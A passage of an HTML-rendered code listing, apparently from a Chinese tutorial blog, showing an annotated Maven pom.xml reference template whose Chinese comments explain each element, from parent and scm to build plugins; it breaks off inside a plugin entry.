class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--父项目的坐标。如果项目中没有规定某个元素的值，那么父项目中的对应值即为项目的默认值。 坐标包括group ID，artifact ID和 </span></span><br><span class="line"><span class="comment">        version。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被继承的父项目的构件标识符 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被继承的父项目的全球唯一标识符 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被继承的父项目的版本 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 父项目的pom.xml文件的相对路径。相对路径允许你选择一个不同的路径。默认值是../pom.xml。Maven首先在构建当前项目的地方寻找父项 </span></span><br><span class="line"><span class="comment">            目的pom，其次在文件系统的这个位置（relativePath位置），然后在本地仓库，最后在远程仓库寻找父项目的pom。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--声明项目描述符遵循哪一个POM模型版本。模型本身的版本很少改变，虽然如此，但它仍然是必不可少的，这是为了当Maven引入了新的特性或者其他模型变更的时候，确保稳定性。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的全球唯一标识符，通常使用全限定的包名区分该项目和其他项目。并且构建时生成的路径也是由此生成， 如com.mycompany.app生成的相对路径为：/com/mycompany/app --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>asia.banseon<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 构件的标识符，它和group ID一起唯一标识一个构件。换句话说，你不能有两个不同的项目拥有同样的artifact ID和groupID；在某个 </span></span><br><span class="line"><span class="comment">        特定的group ID下，artifact ID也必须是唯一的。构件是项目产生的或使用的一个东西，Maven为项目产生的构件包括：JARs，源 码，二进制发布和WARs等。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>banseon-maven2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目产生的构件类型，例如jar、war、ear、pom。插件可以创建他们自己的构件类型，所以前面列的不是全部构件类型 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目当前版本，格式为:主版本.次版本.增量版本-限定版本号 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的名称, Maven产生的文档用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon-maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目主页的URL, Maven产生的文档用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 项目的详细描述, Maven 产生的文档用。 当这个元素能够用HTML格式描述时（例如，CDATA中的文本会被解析器忽略，就可以包含HTML标 </span></span><br><span class="line"><span class="comment">        签）， 不鼓励使用纯文本描述。如果你需要修改产生的web站点的索引页面，你应该修改你自己的索引页文件，而不是调整这里的文档。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A maven project to study maven.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--描述了这个项目构建环境中的前提条件。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prerequisites</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构建该项目或使用该插件所需要的Maven的最低版本 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">prerequisites</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的问题管理系统(Bugzilla, Jira, Scarab,或任何你喜欢的问题管理系统)的名称和URL，本例为 jira --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">issueManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--问题管理系统（例如jira）的名字， --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">system</span>&gt;</span>jira<span class="tag">&lt;/<span class="name">system</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该项目使用的问题管理系统的URL --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://jira.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">issueManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目持续集成信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ciManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--持续集成系统的名字，例如continuum --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">system</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该项目使用的持续集成系统的URL（如果持续集成系统有web接口的话）。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构建完成时，需要通知的开发者/用户的配置项。包括被通知者信息和通知条件（错误，失败，成功，警告） --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">notifiers</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--配置一种方式，当构建中断时，以该方式通知用户/开发者 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">notifier</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--传送通知的途径 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--发生错误时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnError</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建失败时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnFailure</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建成功时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnSuccess</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--发生警告时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnWarning</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--不赞成使用。通知发送到哪里 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">address</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--扩展配置项 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">notifier</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">notifiers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ciManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目创建年份，4位数字。当产生版权信息时需要使用这个值。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">inceptionYear</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目相关邮件列表信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mailingLists</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素描述了项目相关的所有邮件列表。自动产生的网站引用这些信息。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mailingList</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--邮件的名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Demo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--发送邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">post</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">post</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">subscribe</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">subscribe</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--取消订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">unsubscribe</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">unsubscribe</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--你可以浏览邮件信息的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">archive</span>&gt;</span>http:/hi.baidu.com/banseon/demo/dev/<span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mailingList</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mailingLists</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目开发者列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">developers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--某个项目开发者的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developer</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--SCM里项目开发者的唯一标识符 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>HELLO WORLD<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者的全名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者的email --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者的主页的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者在项目中扮演的角色，角色元素描述了各种角色 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">roles</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">role</span>&gt;</span>Project Manager<span class="tag">&lt;/<span class="name">role</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">role</span>&gt;</span>Architect<span class="tag">&lt;/<span class="name">role</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">roles</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者所属组织 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organization</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">organization</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者所属组织的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organizationUrl</span>&gt;</span>http://hi.baidu.com/banseon<span class="tag">&lt;/<span class="name">organizationUrl</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者属性，如即时消息如何处理等 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dept</span>&gt;</span>No<span class="tag">&lt;/<span class="name">dept</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者所在时区， -11到12范围内的整数。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timezone</span>&gt;</span>-5<span class="tag">&lt;/<span class="name">timezone</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">developer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">developers</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的其他贡献者列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">contributors</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--项目的其他贡献者。参见developers/developer元素 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">contributor</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organization</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">organizationUrl</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">roles</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">timezone</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">properties</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">contributor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">contributors</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--该元素描述了项目所有License列表。 应该只列出该项目的license列表，不要列出依赖项目的 license列表。如果列出多个license，用户可以选择它们中的一个而不是接受所有license。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">licenses</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--描述了项目的license，用于生成项目的web站点的license页面，其他一些报表和validation也会用到该元素。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">license</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--license用于法律上的名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Apache 2<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--官方的license正文页面的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.baidu.com/banseon/LICENSE-2.0.txt<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目分发的主要方式： repo，可以从Maven库下载 manual， 用户必须手动下载和安装依赖 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">distribution</span>&gt;</span>repo<span class="tag">&lt;/<span class="name">distribution</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--关于license的补充信息 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">comments</span>&gt;</span>A business-friendly OSS license<span class="tag">&lt;/<span class="name">comments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">license</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">licenses</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--SCM(Source Control Management)标签允许你配置你的代码库，供Maven web站点和其它插件使用。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scm</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--SCM的URL,该URL描述了版本库和如何连接到版本库。欲知详情，请看SCMs提供的URL格式和列表。该连接只读。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">connection</span>&gt;</span></span><br><span class="line">            scm:svn:http://svn.baidu.com/banseon/maven/banseon/banseon-maven2-trunk(dao-trunk)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">connection</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--给开发者使用的，类似connection元素。即该连接不仅仅只读 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developerConnection</span>&gt;</span></span><br><span class="line">            scm:svn:http://svn.baidu.com/banseon/maven/banseon/dao-trunk</span><br><span class="line">        <span class="tag">&lt;/<span class="name">developerConnection</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--当前代码的标签，在开发阶段默认为HEAD --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tag</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指向项目的可浏览SCM库（例如ViewVC或者Fisheye）的URL。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://svn.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">scm</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--描述项目所属组织的各种属性。Maven产生的文档用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">organization</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--组织的全名 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>demo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--组织主页的URL --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">organization</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--构建项目需要的信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素设置了项目源码目录，当构建项目的时候，构建系统会编译目录里的源码。该路径是相对于pom.xml的相对路径。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sourceDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素设置了项目脚本源码目录，该目录和源码目录不同：绝大多数情况下，该目录下的内容 会被拷贝到输出目录(因为脚本是被解释的，而不是被编译的)。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scriptSourceDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素设置了项目单元测试使用的源码目录，当测试项目的时候，构建系统会编译目录里的源码。该路径是相对于pom.xml的相对路径。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testSourceDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被编译过的应用程序class文件存放的目录。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">outputDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被编译过的测试class文件存放的目录。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testOutputDirectory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--使用来自该项目的一系列构建扩展 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">extensions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--描述使用到的构建扩展。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">extension</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建扩展的groupId --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建扩展的artifactId --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建扩展的版本 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">extension</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">extensions</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--当项目没有规定目标（Maven2 叫做阶段）时的默认值 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">defaultGoal</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这个元素描述了项目相关的所有资源路径列表，例如和项目相关的属性文件，这些资源被包含在最终的打包文件里。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--这个元素描述了项目相关或测试相关的所有资源路径 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 描述了资源的目标路径。该路径相对target/classes目录（例如$&#123;project.build.outputDirectory&#125;）。举个例 </span></span><br><span class="line"><span class="comment">                    子，如果你想资源在特定的包里(org.apache.maven.messages)，你就必须该元素设置为org/apache/maven /messages。然而，如果你只是想把资源放到源码目录结构里，就不需要该配置。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--是否使用参数值代替参数名。参数值取自properties元素或者文件里配置的属性，文件在filters元素里列出。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--描述存放资源的目录，该路径相对POM路径 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--包含的模式列表，例如**/*.xml. --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--排除的模式列表，例如**/*.xml --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--这个元素描述了单元测试相关的所有资源路径，例如和单元测试相关的属性文件。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">testResources</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--这个元素描述了测试相关的所有资源路径，参见build/resources/resource元素的说明 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">testResource</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">targetPath</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">filtering</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">includes</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">excludes</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">testResource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">testResources</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构建产生的所有文件存放的目录 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--产生的构件的文件名，默认值是$&#123;artifactId&#125;-$&#123;version&#125;。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--当filtering开关打开时，使用到的过滤器属性文件列表 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filters</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--子项目可以引用的默认插件信息。该插件配置项直到被引用时才会被解析或绑定到生命周期。给定插件的任何本地配置都会覆盖这里的配置 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--使用的插件列表 。 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--plugin元素包含描述插件所需要的信息。 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--插件在仓库里的group ID --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--插件在仓库里的artifact ID --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--被使用的插件的版本（或版本范围） --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--是否从该插件下载Maven扩展（例如打包和类型处理器），由于性能原因，只有在真需要下载时，该元素才被设置成enabled。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">extensions</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--在构建生命周期中执行一组目标的配置。每个目标可能有不同的配置。 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--execution元素包含了插件执行需要的信息 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--执行目标的标识符，用于标识构建过程中的目标，或者匹配继承过程中需要合并的执行目标 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">id</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--绑定了目标的构建生命周期阶段，如果省略，目标会被绑定到源数据里配置的默认阶段 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">phase</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--配置的执行目标 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goals</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--配置是否被传播到子POM --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--作为DOM对象的配置 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--项目引入插件所需要的额外依赖 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!--参见dependencies/dependency元素 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">                            ......</span><br><span class="line">                        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--任何配置是否被传播到子项目 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">inherited</span> /&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!--作为DOM对象的配置 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">pluginManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--使用的插件列表 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--参见build/pluginManagement/plugins/plugin元素 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span> 